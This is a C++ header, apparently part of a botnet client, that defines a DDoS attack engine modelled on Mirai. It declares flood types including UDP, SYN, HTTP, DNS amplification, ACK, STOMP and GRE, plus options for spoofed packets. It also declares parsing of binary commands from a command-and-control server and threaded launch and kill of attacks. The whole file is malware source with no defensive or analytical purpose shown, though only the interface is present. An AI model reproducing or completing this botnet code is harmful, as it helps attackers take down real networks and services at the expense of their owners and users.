// attack.hpp — DDoS attack engine for the bot client.
//
// Architecture mirrors Mirai's attack.c registry pattern:
//   - attack_init() registers N attack vector handlers
//   - attack_parse() deserializes a binary command from the CNC
//   - Each handler spawns in a dedicated thread with configurable duration
//
// The bot receives commands as a binary blob over TCP, calls
// attack_parse(), and the engine forks (well, threads) the attack.

#pragma once

#include <cstdint>
#include <cstddef>
#include <string>
#include <string_view>
#include <vector>
#include <functional>
#include <thread>
#include <atomic>
#include <mutex>

// --- attack type enum (must match CNC's AttackType) ---
enum class AttackType : uint8_t {
    UDP     = 0,  // UDP flood — raw packet spam
    SYN     = 1,  // TCP SYN flood — raw socket handshake spam
    HTTP    = 2,  // HTTP layer-7 flood
    DNS     = 3,  // DNS amplification
    ACK     = 4,  // TCP ACK flood
    STOMP   = 5,  // TCP STOMP flood
    GRE_IP  = 6,  // GRE IP tunnel flood
};

const char* attack_type_name(AttackType t);

// --- option key enum (must match CNC's OptKey) ---
enum class OptKey : uint8_t {
    PKT_SIZE   = 0,  // uint16
    SRC_PORT   = 1,  // uint16
    HTTP_METH  = 2,  // string
    HTTP_PATH  = 3,  // string
    HTTP_HOST  = 4,  // string
    THREADS    = 5,  // uint8
    SPOOFED    = 6,  // uint8
};

// --- parsed attack command ---
struct AttackTarget {
    uint32_t ip;    // network byte order (from wire)
    uint16_t port;  // network byte order (from wire)
};

struct AttackOption {
    OptKey             key;
    std::vector<uint8_t> val;
};

struct AttackCommand {
    uint32_t               id;
    uint32_t               duration_secs;
    AttackType             type;
    std::vector<AttackTarget> targets;
    std::vector<AttackOption> options;

    // --- helpers to extract option values ---
    uint16_t get_uint16(OptKey key, uint16_t default_val = 0) const;
    uint8_t  get_uint8(OptKey key, uint8_t default_val = 0) const;
    std::string get_string(OptKey key, std::string default_val = "") const;
};

// --- attack function signature ---
// Called from a dedicated thread. The function should run for
// `duration_ms` milliseconds, then return.
using AttackFunc = std::function<void(const AttackCommand&, const AttackTarget&, uint32_t duration_ms)>;

// --- engine ---

namespace attack {

// Call once at startup to register all attack vectors.
void init();

// Parse a binary attack command buffer received from the CNC.
// Returns true on success, false on malformed data.
bool parse(const uint8_t* data, size_t len, AttackCommand& out);

// Launch an attack in a background thread. Non-blocking.
// The attack runs for out.duration_secs seconds, then the thread exits.
void launch(const AttackCommand& cmd);

// Kill all running attacks immediately.
void kill_all();

// Number of attacks currently running.
size_t running_count();

} // namespace attack
